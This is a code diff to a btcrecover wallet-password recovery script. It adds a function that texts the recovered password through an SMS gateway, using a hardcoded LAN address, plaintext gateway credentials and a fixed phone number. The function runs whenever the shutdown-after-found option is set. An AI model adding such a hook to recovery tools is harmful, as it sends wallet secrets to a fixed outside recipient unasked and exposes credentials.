@@ -29,6 +29,8 @@ import compatibility_check
 
 from btcrecover import btcrpass
 import sys, multiprocessing, subprocess, os, re
+import requests
+import urllib.parse
 
 def disable_network_interfaces():
         """Disable all network interfaces on the system.
@@ -66,6 +68,28 @@ def disable_network_interfaces():
                                 subprocess.call(["ip", "link", "set", name, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except Exception as e:
                 print("Failed to disable network:", e, file=sys.stderr)
+
+def send_sms(message,
+             gateway="192.168.1.99",
+             port=80,
+             username="apitg800",
+             password="alciona",
+             simslot=2,
+             number="0740660399"):
+        """Send ``message`` via the configured SMS gateway."""
+
+        encoded_message = urllib.parse.quote(message)
+        url = (f"http://{gateway}:{port}/cgi/WebCGI?1500101="
+               f"account={username}&password={password}&port={simslot}"
+               f"&destination={number}&content={encoded_message}")
+        try:
+                response = requests.get(url, timeout=5)
+                if response.status_code != 200:
+                        print(f"Failed to send SMS. Status code: {response.status_code}", file=sys.stderr)
+                else:
+                        print("SMS sent successfully!")
+        except Exception as e:
+                print(f"Error sending SMS: {e}", file=sys.stderr)
 
 if __name__ == "__main__":
 	print()
@@ -108,6 +132,11 @@ if __name__ == "__main__":
 
                 # Shut the machine down when requested
                 if btcrpass.args.shutdown_after_found:
+
+
+                        # Send an SMS with the password before disconnecting
+                        send_sms(f"Recovered password: {password_found}")
+
 
                         # Optionally disconnect from the network before shutting down
                         if btcrpass.args.disable_network:
